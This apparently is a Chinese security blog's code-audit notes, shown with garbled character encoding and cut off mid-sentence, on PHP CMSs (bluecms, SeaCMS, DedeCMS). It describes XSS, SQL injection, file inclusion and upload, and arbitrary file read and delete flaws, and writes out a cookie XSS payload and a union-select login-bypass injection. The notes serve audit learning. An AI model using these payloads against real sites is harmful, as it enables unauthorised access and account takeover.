title="æ€»ç»“å¤§è‡´æµç¨‹"></a>æ€»ç»“å¤§è‡´æµç¨‹</h1><p><strong>1ã€å…ˆå…¨å±€æ€»è§ˆï¼šå…¥å£æ–‡ä»¶ã€è·¯ç”±ã€å…¨å±€å¤„ç†æ–¹å¼ç­‰</strong><br><strong>2ã€å®šå‘åŠŸèƒ½å®¡è®¡ï¼šé»‘ç›’(æ‰¾åˆ°æ•æ„ŸåŠŸèƒ½)+ç™½ç›’ï¼ˆå®šä½åˆ°ä»£ç è¿›è¡Œå®¡è®¡ï¼‰</strong><br><strong>3ã€æ•æ„Ÿå‡½æ•°å›æº¯</strong></p><p>å…ˆé»‘ç›’+ç™½ç›’çœ‹æ•æ„ŸåŠŸèƒ½ï¼Œå†ç”¨è‡ªåŠ¨åŒ–å®¡è®¡å·¥å…·è·‘ä¸€éå¹¶éªŒè¯ï¼Œæœ€åå†æ ¹æ®æ¼æ´å±é™©å‡½æ•°å»å›æº¯</p><h3 id="è‡ªåŠ¨åŒ–å®¡è®¡å·¥å…·"><a href="#è‡ªåŠ¨åŒ–å®¡è®¡å·¥å…·" class="headerlink" title="è‡ªåŠ¨åŒ–å®¡è®¡å·¥å…·"></a>è‡ªåŠ¨åŒ–å®¡è®¡å·¥å…·</h3><p>RIPS<a href="https://github.com/J0o1ey/rips-Chinese">https://github.com/J0o1ey/rips-Chinese</a></p><p>seay</p><p>Fortify</p><h1 id="bluecms"><a href="#bluecms" class="headerlink" title="bluecms"></a>bluecms</h1><h2 id="é»‘ç›’æµ‹è¯•"><a href="#é»‘ç›’æµ‹è¯•" class="headerlink" title="é»‘ç›’æµ‹è¯•"></a>é»‘ç›’æµ‹è¯•</h2><h4 id="ç”¨æˆ·æ³¨å†Œ"><a href="#ç”¨æˆ·æ³¨å†Œ" class="headerlink" title="ç”¨æˆ·æ³¨å†Œ"></a>ç”¨æˆ·æ³¨å†Œ</h4><p>åœ¨æ³¨å†Œæ—¶ï¼Œé‚®ç®±æ’å…¥xssä»£ç </p><p><img src="/../images/image-20221202120912126-1686141975680.png" alt="image-20221202120912126"></p><p><img src="/../images/image-20221202120807928-1686141975682.png" alt="image-20221202120807928"></p><p><img src="/../images/image-20221202120844185-1686141975683.png" alt="image-20221202120844185"></p><h4 id="ç”¨æˆ·å¤´åƒ"><a href="#ç”¨æˆ·å¤´åƒ" class="headerlink" title="ç”¨æˆ·å¤´åƒ"></a>ç”¨æˆ·å¤´åƒ</h4><p>ä¸Šä¼ æ–‡ä»¶ï¼Œåªå…è®¸ä¸Šä¼ å›¾ç‰‡åç¼€çš„æ–‡ä»¶ï¼Œä¸Šä¼ åæœ‰ç»™å‡ºå›¾ç‰‡è·¯å¾„ï¼Œé‚£ä¹ˆä¸èƒ½é…åˆ.htaccessï¼Œéœ€è¦æ‰¾åˆ°ä¸€ä¸ªæ–‡ä»¶åŒ…å«çš„ç‚¹æ¥åŒ…å«æ–‡ä»¶ã€‚</p><img src="E:\typora img\image-20221202121559453.png" alt="image-20221202121559453" style="zoom:80%;" /><h4 id="ä¿®æ”¹å¯†ç "><a href="#ä¿®æ”¹å¯†ç " class="headerlink" title="ä¿®æ”¹å¯†ç "></a>ä¿®æ”¹å¯†ç </h4><p>æ˜¯å¦å­˜åœ¨è¶Šæƒ,æµ‹è¯•äº†æ²¡æœ‰</p><h4 id="å‘å¸ƒæ–°é—»"><a href="#å‘å¸ƒæ–°é—»" class="headerlink" title="å‘å¸ƒæ–°é—»"></a>å‘å¸ƒæ–°é—»</h4><img src="E:\typora img\image-20221202122851275.png" alt="image-20221202122851275" style="zoom:67%;" /><p>è¿™é‡Œåˆ†ç±»é€‰æ‹©ä¸äº†ï¼Œåº”è¯¥æ˜¯è¦ç®¡ç†å‘˜å‘å¸ƒã€‚</p><h4 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h4><p>ç®¡ç†å‘˜</p><p><img src="/../images/image-20221202123640697-1686141975683.png" alt="image-20221202123640697"></p><p>å…¶ä»–</p><p><img src="/../images/image-20221202125147298-1686141975683.png" alt="image-20221202125147298"></p><h4 id="åå°ç™»å½•"><a href="#åå°ç™»å½•" class="headerlink" title="åå°ç™»å½•"></a>åå°ç™»å½•</h4><p><img src="/../images/image-20221202123831559-1686141975683.png" alt="image-20221202123831559"></p><p>è¿™é‡Œæ²¡æœ‰éªŒè¯ç éªŒè¯ï¼Œé‚£ä¹ˆå¯ä»¥å¾ˆè½»æ¾åœ°è¿›è¡Œçˆ†ç ´ï¼Œå¾—åˆ°usernmae&#x3D;adminï¼Œpasswd&#x3D;admin</p><img src="E:\typora img\image-20221202124055555.png" alt="image-20221202124055555" style="zoom:67%;" /><p>è¿›å»ä¹‹åï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªå»ºè®®ï¼Œinstallæ–‡ä»¶å¤¹ï¼Œä¸Šé¢é€šè¿‡dirsearchä¹Ÿæ‰«æå‡ºäº†è¿™ä¸ªæ–‡ä»¶ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶å¤¹æ¥é‡æ–°å®‰è£…ç½‘ç«™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥é‡ç½®ç®¡ç†å‘˜äº†ï¼Œå¯æƒœæ˜¯ä¸å¯ä»¥çš„ã€‚</p><p><img src="/../images/image-20221202124235008-1686141975683.png" alt="image-20221202124235008"></p><h4 id="å¸¸ç”¨æ“ä½œ"><a href="#å¸¸ç”¨æ“ä½œ" class="headerlink" title="å¸¸ç”¨æ“ä½œ"></a>å¸¸ç”¨æ“ä½œ</h4><p>å‘å¸ƒæœ¬åœ°æ–°é—»è¿™é‡Œå­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ“ä½œï¼Œä½†æ˜¯ä¹Ÿåªèƒ½ä¸Šä¼ å›¾ç‰‡</p><p><img src="/../images/image-20221202175209000-1686141975683.png" alt="image-20221202175209000"></p><h4 id="ä¼šå‘˜ç®¡ç†"><a href="#ä¼šå‘˜ç®¡ç†" class="headerlink" title="ä¼šå‘˜ç®¡ç†"></a>ä¼šå‘˜ç®¡ç†</h4><p>å¯ä»¥å‘ç°è§¦å‘äº†ä¹‹å‰çš„xssï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬æ²¡æœ‰ç™»é™†ä¸Šåå°ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è¿™ä¸ªxssæ¥ğŸ£è·å–ç®¡ç†å‘˜çš„cookieã€‚</p><p><img src="/../images/image-20221202124632258-1686141975683.png" alt="image-20221202124632258"></p><p>ä¹Ÿå¯ä»¥ä¿®æ”¹ç®¡ç†å‘˜å¯†ç ï¼Œè€Œä¸”æ²¡æœ‰ä»»ä½•éªŒè¯ï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹ã€‚ã€‚</p><p><img src="/../images/image-20221202175052927-1686141975686.png" alt="image-20221202175052927"></p><h2 id="ç™½ç›’å®¡è®¡"><a href="#ç™½ç›’å®¡è®¡" class="headerlink" title="ç™½ç›’å®¡è®¡"></a>ç™½ç›’å®¡è®¡</h2><p>å…ˆçœ‹ä¸€ä¸‹ç›®å½•</p><p><img src="/../images/image-20221202155440394-1686141975685.png" alt="image-20221202155440394"></p><h3 id="å‰å°"><a href="#å‰å°" class="headerlink" title="å‰å°"></a>å‰å°</h3><p>å…ˆçœ‹ä¸€ä¸‹å‰å°çš„index.phpï¼Œå†…å®¹å·®ä¸å¤šå°±æ˜¯æ¸²æŸ“é¡µé¢ï¼Œæ²¡æœ‰ç”¨æˆ·å¯æ§çš„å‚æ•°ï¼Œæ‰€ä»¥å…³æ³¨å…¶åŒ…å«çš„å…¶ä»–æ–‡ä»¶ã€‚</p><p><img src="/../images/image-20221202135553953-1686141975686.png" alt="image-20221202135553953"></p><p>è·Ÿè¿›common.inc.phpçœ‹ä¸€ä¸‹</p><p>å…³é”®éƒ¨åˆ†ï¼Œç”¨æ¥éªŒè¯ç”¨æˆ·èº«ä»½ï¼Œå…¶ä¸­cookieä¸­çš„å‚æ•°æ˜¯å¯æ§çš„ã€‚</p><p><img src="/../images/image-20221202135942047-1686141975683.png" alt="image-20221202135942047"></p><p>å…ˆåˆ¤æ–­cookieä¸­æ˜¯å¦æœ‰user_idï¼Œæœ‰çš„è¯å†ç»§ç»­åˆ¤æ–­user_nameå’Œuser_pwdæ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨å°±check_cookieï¼Œå¦‚æœåªæœ‰user_nameå­˜åœ¨å°±æŸ¥è¯¢åå­—æ˜¯å¦åªæœ‰ä¸€ä¸ªï¼Œå…¶ä»–æƒ…å†µset_cookieã€‚</p><h4 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h4><p>è·Ÿè¿›check_cookie</p><p><img src="/../images/image-20221202140225964-1686141975683.png" alt="image-20221202140225964"></p><p>æŸ¥usernameå¯¹åº”çš„å¯†ç ï¼Œç»è¿‡æ•£åˆ—å¤„ç†åˆ¤æ–­å¯†ç æ˜¯å¦æ­£ç¡®ã€‚</p><p>è·Ÿè¿›getoneâ€“åœ¨include&#x2F;mysql.class.phpä¸­</p><p><img src="/../images/image-20221202140336939-1686141975683.png" alt="image-20221202140336939"></p><p><img src="/../images/image-20221202140349680-1686141975683.png" alt="image-20221202140349680"></p><p><img src="/../images/image-20221202185616902-1686141975684.png" alt="image-20221202185616902"></p><p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰å¯¹sqlè¯­å¥åšä»»ä½•å¤„ç†ï¼Œç›´æ¥ç”¨mysql_queryè¿›è¡ŒæŸ¥è¯¢ï¼Œsqlè¯­å¥é”™è¯¯æ—¶ï¼Œè¿”å›é”™è¯¯æ¶ˆæ¯Query errorï¼Œç„¶åæ˜¯å‰é¢åŠ äº†ä¸€ä¸ª@ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨æŠ¥é”™æ³¨å…¥ã€‚</p><p>å†è§‚å¯Ÿinclude&#x2F;mysql.class.phpå¯ä»¥å‘ç°</p><img src="E:\typora img\image-20221202190550614.png" alt="image-20221202190550614" style="zoom:80%;" /><p>å‘ç°å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ï¼Œé‚£ä¹ˆè¿™ä¸ªCMSå°±å¯ä»¥éšä¾¿æ³¨å…¥äº†ã€‚ã€‚ã€‚ï¼ˆå› ä¸ºæ‰€æœ‰çš„sqlæ“ä½œéƒ½æ˜¯ç”¨è¿™ä¸ªmysqlç±»ï¼‰</p><p>ä»¥ad_js.phpä¸ºä¾‹</p><img src="E:\typora img\image-20221202190230473.png" alt="image-20221202190230473" style="zoom:80%;" /><p><img src="/../images/image-20221202190707634-1686141975684.png" alt="image-20221202190707634"></p><h4 id="æ–‡ä»¶åŒ…å«-æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶åŒ…å«-æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶åŒ…å«+æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶åŒ…å«+æ–‡ä»¶ä¸Šä¼ </h4><p>è™½ç„¶æœ‰ç™½åå•é™åˆ¶ï¼Œåªèƒ½ä¸Šä¼ å›¾ç‰‡ï¼Œä½†æ˜¯æ²¡æœ‰å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œè¿‡æ»¤</p><p><img src="/../images/image-20221202171406255-1686141975684.png" alt="image-20221202171406255"></p><p>å¹¶ä¸”åœ¨user.phpä¸­ï¼Œæ²¡æœ‰å¯¹$_POST[â€˜payâ€™]è¿›è¡Œè¿‡æ»¤ï¼Œå­˜åœ¨ç›®å½•ç©¿è¶Šï¼Œå°±å¯ä»¥åŒ…å«ä¸Šä¼ çš„ç”¨æˆ·å¤´åƒã€‚</p><p><img src="/../images/image-20221202185910243-1686141975684.png" alt="image-20221202185910243"></p><h4 id="ä»»æ„æ–‡ä»¶åˆ é™¤"><a href="#ä»»æ„æ–‡ä»¶åˆ é™¤" class="headerlink" title="ä»»æ„æ–‡ä»¶åˆ é™¤"></a>ä»»æ„æ–‡ä»¶åˆ é™¤</h4><p>publish.php</p><p><img src="/../images/image-20221202190938927-1686141975684.png" alt="image-20221202190938927"></p><p>user.php</p><p>â€‹<img src="/../images/image-20221202194855624-1686141975684.png" alt="image-20221202194855624"></p><p>éœ€è¦å…ˆæ’å…¥ä¸€æ¡æ–°é—»ï¼Œæ–°é—»åä¸ºè¦åˆ é™¤çš„æ–‡ä»¶çš„è·¯å¾„ã€‚</p><h3 id="åå°â€“-x2F-admin"><a href="#åå°â€“-x2F-admin" class="headerlink" title="åå°â€“&#x2F;admin"></a>åå°â€“&#x2F;admin</h3><p>è¿˜æ˜¯å…ˆçœ‹ä¸€ä¸‹index.phpï¼Œä¹Ÿæ˜¯åªæ˜¯è¾“å‡ºäº†CMSå’Œç³»ç»Ÿçš„ä¸€äº›ä¿¡æ¯ï¼Œæ‰€ä»¥å…³æ³¨å…¶åŒ…å«çš„æ–‡ä»¶</p><p><img src="/../images/image-20221202191939851-1686141975684.png" alt="image-20221202191939851"></p><p>å…³é”®å†…å®¹</p><p><img src="/../images/image-20221202192232288-1686141975684.png" alt="image-20221202192232288"></p><p>å¯¹è¾“å…¥çš„å‚æ•°éƒ½ä½¿ç”¨addslashes()è¿›è¡Œè½¬ä¹‰,ä¸è¿‡è¿˜æœ‰<code>$SERVER</code>æ²¡æœ‰è¿›è¡Œå¤„ç†ã€‚</p><img src="E:\typora img\image-20221202192459456.png" alt="image-20221202192459456" style="zoom:80%;" /><p>â€‹ä½¿ç”¨sessionæ¥éªŒè¯adminèº«ä»½ã€‚è¿˜æ˜¯ä¸€æ ·çš„ä½¿ç”¨check_cookieæ¥åˆ¤æ–­ï¼Œ</p><p>â€‹<img src="E:\typora img\image-20221202140225964.png" alt="image-20221202140225964" style="zoom:80%;" /></p><p>â€‹éœ€è¦å¾—åˆ°adminçš„pwdå’Œcookie_hashï¼Œè¿™ä¸¤ä¸ªéƒ½åœ¨æ•°æ®åº“ä¸­ï¼Œå¯ä»¥åˆ©ç”¨å‰å°çš„sqlæ³¨å…¥è·å¾—ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡è¿™ä¸ªæ¥ç™»å½•adminç”¨æˆ·ã€‚</p><h4 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h4><p><img src="/../images/image-20221202195311948-1686141975684.png" alt="image-20221202195311948"></p><p><img src="/../images/image-20221202195409112-1686141975684.png" alt="image-20221202195409112"></p><h4 id="ä»»æ„æ–‡ä»¶ä¸Šä¼ "><a href="#ä»»æ„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="ä»»æ„æ–‡ä»¶ä¸Šä¼ "></a>ä»»æ„æ–‡ä»¶ä¸Šä¼ </h4><img src="E:\typora img\image-20221202191243192.png" alt="image-20221202191243192" style="zoom:80%;" /><img src="E:\typora img\image-20221202191403061.png" alt="image-20221202191403061" style="zoom: 80%;" /><p>æ–‡ä»¶è·¯å¾„åªä½œäº†å»é™¤å¤´å°¾ç©ºæ ¼çš„å¤„ç†ï¼Œå­˜åœ¨ç›®å½•ç©¿è¶Šï¼›æ–‡ä»¶å†…å®¹å®é™…ä¸Šæ˜¯è°ƒç”¨äº†stripslashesï¼Œå¹¶æ²¡æœ‰è¿‡æ»¤ã€‚</p><p>æµ‹è¯•</p><img src="E:\typora img\image-20221202194248639.png" alt="image-20221202194248639" style="zoom:80%;" /><img src="E:\typora img\image-20221202194300861.png" alt="image-20221202194300861" style="zoom:80%;" /><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™ä¸ªCMSè¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œå› ä¸ºå‡ ä¹æ²¡æœ‰è¿‡æ»¤ã€‚</p><h1 id="SeaCMS"><a href="#SeaCMS" class="headerlink" title="SeaCMS"></a>SeaCMS</h1><p>ç½‘ç«™æ¶æ„ï¼Œæ— æ¡†æ¶ï¼Œç›®å½•ç»“æ„å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">â”œâ”€admin   <span class="comment"># åå°</span></span><br><span class="line">â”œâ”€css  <span class="comment"># å­˜æ”¾cssæ–‡ä»¶</span></span><br><span class="line">â”œâ”€files  <span class="comment"># å­˜æ”¾é¡µé¢</span></span><br><span class="line">â”œâ”€images  <span class="comment"># å­˜æ”¾å›¾ç‰‡</span></span><br><span class="line">â”œâ”€inc  <span class="comment"># å­˜æ”¾ç½‘ç«™é…ç½®ï¼Œæ ¡éªŒï¼Œè¿‡æ»¤æ–‡ä»¶</span></span><br><span class="line">â”œâ”€install <span class="comment"># ç½‘ç«™å®‰è£…</span></span><br><span class="line">â”œâ”€seacmseditor <span class="comment"># ç½‘ç«™ç¼–è¾‘å™¨</span></span><br><span class="line">â”œâ”€template <span class="comment"># ç½‘ç«™æ¨¡æ¿</span></span><br><span class="line">â””â”€upload   <span class="comment"># å­˜æ”¾ä¸Šä¼ æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><h2 id="æŸ¥çœ‹å…¥å£æ–‡ä»¶"><a href="#æŸ¥çœ‹å…¥å£æ–‡ä»¶" class="headerlink" title="æŸ¥çœ‹å…¥å£æ–‡ä»¶"></a>æŸ¥çœ‹å…¥å£æ–‡ä»¶</h2><p>æ‰€æœ‰çš„å…¥å£éƒ½æ˜¯é€šè¿‡ä¼ é€’rå‚æ•°æ¥åˆ†å‘è·¯ç”±ï¼Œå¯¹åº”filesç›®å½•ä¸­çš„æ–‡ä»¶</p><p><img src="/../images/image-20230525134023397-1686141975684.png" alt="image-20230525134023397"></p><p><img src="/../images/image-20230525141822013-1686141975684.png" alt="image-20230525141822013"></p><p>è¿™é‡Œåªç”¨<code>addslashes</code>è¿›è¡Œäº†è½¬ä¹‰ï¼Œæ˜æ˜¾è·¯å¾„ç©¿è¶Š+æ–‡ä»¶åŒ…å«</p><p><img src="/../images/image-20230525134741282-1686141975685.png" alt="image-20230525134741282"></p><p>å…¶ä»–æ€è·¯</p><ul><li><p>å¦‚æœæ˜¯linuxç³»ç»Ÿï¼Œä¹Ÿå¯ä»¥é€šè¿‡<code>pearcmd.php</code>æ¥getshell</p><blockquote><p>åœ¨7.3åŠä»¥å‰ï¼Œpecl&#x2F;pearæ˜¯é»˜è®¤å®‰è£…çš„ï¼›åœ¨7.4åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™æŒ‡å®šâ€“with-pearæ‰ä¼šå®‰è£…</p></blockquote></li><li><p>å°è¯•%00æˆªæ–­è·¯å¾„ï¼Œé€ æˆä»»æ„æ–‡ä»¶è¯»å–ï¼Œä¸çŸ¥é“ä¸ºå•¥å¤±è´¥äº†ï¼Œç¯å¢ƒï¼šphp5.3.29ï¼Œ<strong>magic_quotes_gpc</strong>&#x3D;OFF</p></li><li><p>å¦‚æœphpç‰ˆæœ¬å°äº5.2.8ï¼Œlinux éœ€è¦æ–‡ä»¶åé•¿äº 4096ï¼Œwindows éœ€è¦é•¿äº 256ï¼Œè¶…è¿‡éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒä»è€Œå®ç°æ–‡ä»¶åŒ…å«ç»•è¿‡åç¼€.phpé™åˆ¶</p></li></ul><h2 id="æŸ¥çœ‹é…ç½®æ–‡ä»¶"><a href="#æŸ¥çœ‹é…ç½®æ–‡ä»¶" class="headerlink" title="æŸ¥çœ‹é…ç½®æ–‡ä»¶"></a>æŸ¥çœ‹é…ç½®æ–‡ä»¶</h2><p>é€šè¿‡installç›®å½•ä¸‹çš„InstallLock.txtæ˜¯å¦å­˜åœ¨æ¥åˆ¤æ–­æ˜¯å¦å®‰è£…ï¼Œå¦‚æœå¯ä»¥åˆ é™¤è¯¥æ–‡ä»¶ï¼Œå°±å¯ä»¥é…åˆå…¥å£æ–‡ä»¶çš„æ–‡ä»¶åŒ…å«æ¼æ´æ¥é‡æ–°å®‰è£…ç½‘ç«™ã€‚</p><p><img src="/../images/image-20230525135351792-1686141975685.png" alt="image-20230525135351792"></p><p>æ•°æ®åº“ç¼–ç ä¸º<code>utf-8</code>ï¼Œä¸å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥</p><p><img src="/../images/image-20230525135521039-1686141975685.png" alt="image-20230525135521039"></p><h2 id="æŸ¥çœ‹èº«ä»½æ ¡éªŒæ–‡ä»¶"><a href="#æŸ¥çœ‹èº«ä»½æ ¡éªŒæ–‡ä»¶" class="headerlink" title="æŸ¥çœ‹èº«ä»½æ ¡éªŒæ–‡ä»¶"></a>æŸ¥çœ‹èº«ä»½æ ¡éªŒæ–‡ä»¶</h2><p><img src="/../images/image-20230525140710113-1686141975685.png" alt="image-20230525140710113"></p><p>å‚ç›´è¶Šæƒï¼Œåªè¦åœ¨cookieä¸­åŠ å…¥userå€¼</p><p><img src="/../images/image-20230525140957487-1686141975685.png" alt="image-20230525140957487"></p><h2 id="å‰å°-1"><a href="#å‰å°-1" class="headerlink" title="å‰å°"></a>å‰å°</h2><h3 id="about-php"><a href="#about-php" class="headerlink" title="about.php"></a><code>about.php</code></h3><p><img src="/../images/image-20230525141923350-1686141975685.png" alt="image-20230525141923350"></p><p>ä½¿ç”¨<code>addslashes</code>æ¥è¿‡æ»¤ï¼Œé€ƒé€¸ä¸äº†å¼•å·ï¼Œæ‰€ä»¥ä¸å­˜åœ¨sqlæ³¨å…¥</p><h3 id="concat-php"><a href="#concat-php" class="headerlink" title="concat.php"></a><code>concat.php</code></h3><p>sqléƒ½ç”¨äº†<code>addslashes</code>æ¥è¿‡æ»¤</p><p>ä½†æ˜¯å­˜åœ¨xss</p><p><img src="/../images/image-20230525142829890-1686141975685.png" alt="image-20230525142829890"></p><p><img src="/../images/image-20230525142841766-1686141975685.png" alt="image-20230525142841766"></p><p><img src="/../images/image-20230525143133231-1686141975685.png" alt="image-20230525143133231"></p><p><img src="/../images/image-20230525143813133-1686141975685.png" alt="image-20230525143813133"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cookie:name=<span class="string">&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230525144008677-1686141975686.png" alt="image-20230525144008677"></p><h3 id="content-php"><a href="#content-php" class="headerlink" title="content.php"></a><code>content.php</code></h3><p>å­˜åœ¨æ•°å­—å‹ç»ˆäºå¯ä»¥æ³¨å…¥äº†ï¼Œé…åˆ<code>mysql_error</code>è¿›è¡ŒæŠ¥é”™æ³¨å…¥</p><p><img src="/../images/image-20230525144109692-1686141975686.png" alt="image-20230525144109692"></p><p><img src="/../images/image-20230525144251129-1686141975686.png" alt="image-20230525144251129"></p><h3 id="submit-php"><a href="#submit-php" class="headerlink" title="submit.php"></a><code>submit.php</code></h3><p><img src="/../images/image-20230525145929543-1686141975686.png" alt="image-20230525145929543"></p><p><img src="/../images/image-20230525151458927-1686141975686.png" alt="image-20230525151458927"></p><p>å› ä¸ºéªŒè¯ç æ­£ç¡®åä¹Ÿä¸åˆ·æ–°ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨åŒä¸€ä¸ªéªŒè¯ç è¿›è¡Œæ³¨å…¥</p><p><img src="/../images/image-20230525151429571-1686141975686.png" alt="image-20230525151429571"></p><p>å­˜å‚¨xss</p><p>è¿‡æ»¤</p><p><img src="/../images/image-20230525145800880-1686141975686.png" alt="image-20230525145800880"></p><p>ä½†æ˜¯è¿˜æ˜¯å¯ä»¥åœ¨nameå¤„ä¿å­˜</p><p>è¾“å‡ºç‚¹</p><p><img src="/../images/image-20230525145901519-1686141975686.png" alt="image-20230525145901519"></p><h2 id="åå°"><a href="#åå°" class="headerlink" title="åå°"></a>åå°</h2><h3 id="åå°ç™»å½•-1"><a href="#åå°ç™»å½•-1" class="headerlink" title="åå°ç™»å½•"></a>åå°ç™»å½•</h3><p><img src="/../images/image-20230525153016604-1686141975686.png" alt="image-20230525153016604"></p><p>æ²¡æœ‰è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨è”åˆæŸ¥è¯¢æ„é€ ä¸´æ—¶ç”¨æˆ·æ•°æ®ç™»å½•,æˆ–è€…æŠ¥é”™æ³¨å…¥æ‹¿åˆ°å¯†ç åè§£å¯†ç™»å½•</p><p>åˆ¤æ–­å­—æ®µæ•°</p><p><img src="/../images/image-20230525153002742-1686141975686.png" alt="image-20230525153002742"></p><p>ç¡®å®šç”¨æˆ·åï¼Œå¯†ç å­—æ®µä½ç½®</p><p><img src="/../images/image-20230525154135880-1686141975687.png" alt="image-20230525154135880"></p><p>è”åˆæŸ¥è¯¢ç™»é™†</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">user=-<span class="number">1</span><span class="string">&#x27;+union+select+1,2,&#x27;</span>admin<span class="string">&#x27;,&#x27;</span>c4ca4238a0b923820dcc509a6f75849b<span class="string">&#x27;,5,6,7,8#&amp;password=1&amp;login=yes</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230525154322362-1686141975687.png" alt="image-20230525154322362"></p><h3 id="æ–‡ä»¶ä¸Šä¼ å¤„"><a href="#æ–‡ä»¶ä¸Šä¼ å¤„" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ å¤„"></a>æ–‡ä»¶ä¸Šä¼ å¤„</h3><p><code>up.class.php</code></p><p>ç™½åå•ï¼Œæ–‡ä»¶å¤§å°æ£€æµ‹ï¼Œæ–‡ä»¶æ—¶é—´æˆ³é‡å‘½å,å›¾ç‰‡è£å‰ªç”Ÿæˆç¼©ç•¥å›¾</p><p>æ²¡å•¥ç”¨ï¼Œéœ€è¦é…åˆå…¶ä»–æ¼æ´</p><h1 id="DedeCMS"><a href="#DedeCMS" class="headerlink" title="DedeCMS"></a>DedeCMS</h1><p>è¿›è¡ŒåŠŸèƒ½ç‚¹å®¡è®¡</p><h2 id="å…¨å±€æ€»è§ˆ"><a href="#å…¨å±€æ€»è§ˆ" class="headerlink" title="å…¨å±€æ€»è§ˆ"></a>å…¨å±€æ€»è§ˆ</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å…¥å£æ–‡ä»¶ä¸»è¦æœ‰ä¸‰ä¸ª</span><br><span class="line">å‰å°</span><br><span class="line">åå°ï¼šdede/</span><br><span class="line">ä¼šå‘˜ï¼šmember/</span><br></pre></td></tr></table></figure><p>å…¨å±€å‡½æ•°<br>åœ¨é¡¹ç›®æ ¹ç›®å½•çš„indexæ–‡ä»¶åŒ…å«çš„&#x2F;include&#x2F;common.inc.phpä¸­<br>è¿‡æ»¤çš„ï¼š</p><p>æ£€æŸ¥å’Œæ³¨å†Œå¤–éƒ¨æäº¤çš„å˜é‡ï¼Œ<code>CheckRequest</code></p><p><img src="/../images/image-20230526102737909-1686141975687.png" alt="image-20230526102737909"></p><p>æ–‡ä»¶ä¸Šä¼ çš„</p><p><img src="/../images/image-20230526102806414-1686141975687.png" alt="image-20230526102806414"></p><p>åˆ†é¡µå‚æ•°çš„</p><p><img src="/../images/image-20230526102852980-1686141975687.png" alt="image-20230526102852980"></p><p>å‡½æ•°é›†</p><p><img src="/../images/image-20230526102920759-1686141975687.png" alt="image-20230526102920759"></p><p><code>include/filter.inc.php</code></p><p>è¿‡æ»¤ä¸æ–‡æ˜å†…å®¹çš„ğŸ˜…ï¼Œä¸æ˜¯ä¸ºäº†é˜²å¾¡æ¼æ´çš„</p><h2 id="æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ç‚¹"><a href="#æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ç‚¹" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ç‚¹"></a>æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ç‚¹</h2><h3 id="dede-archives-do-php"><a href="#dede-archives-do-php" class="headerlink" title=" /dede/archives_do.php"></a><code> /dede/archives_do.php</code></h3><p><img src="/../images/image-20230525201745708-1686141975687.png" alt="image-20230525201745708"></p><p><img src="/../images/image-20230525200159854-1686141975687.png" alt="image-20230525200159854"></p><p>å®é™…ä¸Šæ˜¯è°ƒç”¨äº†<code>upload.helper.php</code>ä¸­çš„<code>AdminUpload</code>æ–¹æ³•</p><p><img src="/../images/image-20230525201545164-1686141975687.png" alt="image-20230525201545164"></p><p><img src="/../images/image-20230525201700590-1686141975687.png" alt="image-20230525201700590"></p><p>å¯ä»¥çœ‹åˆ°åªå¯¹æ–‡ä»¶çš„MIMEç±»å‹è¿›è¡Œäº†æ ¡éªŒ,æ²¡æœ‰å¯¹æ–‡ä»¶åç¼€è¿›è¡Œæ ¡éªŒ</p><p>å†çœ‹ä¸€ä¸‹å…¨å±€é˜²æŠ¤<code>uploadsafe.inc.php</code></p><p><img src="/../images/image-20230525201856657-1686141975688.png" alt="image-20230525201856657"></p><p><img src="/../images/image-20230525201949967-1686141975688.png" alt="image-20230525201949967"></p><p>è™½ç„¶æœ‰é»‘åå•ï¼Œä½†æ˜¯é»‘åå•å¯¹ç®¡ç†å‘˜ç”¨æˆ·æ— æ•ˆ</p><p><img src="/../images/image-20230525202104709-1686141975688.png" alt="image-20230525202104709"></p><p>æœ€åç”¨<code>getimagesize</code>è¿›è¡Œæ 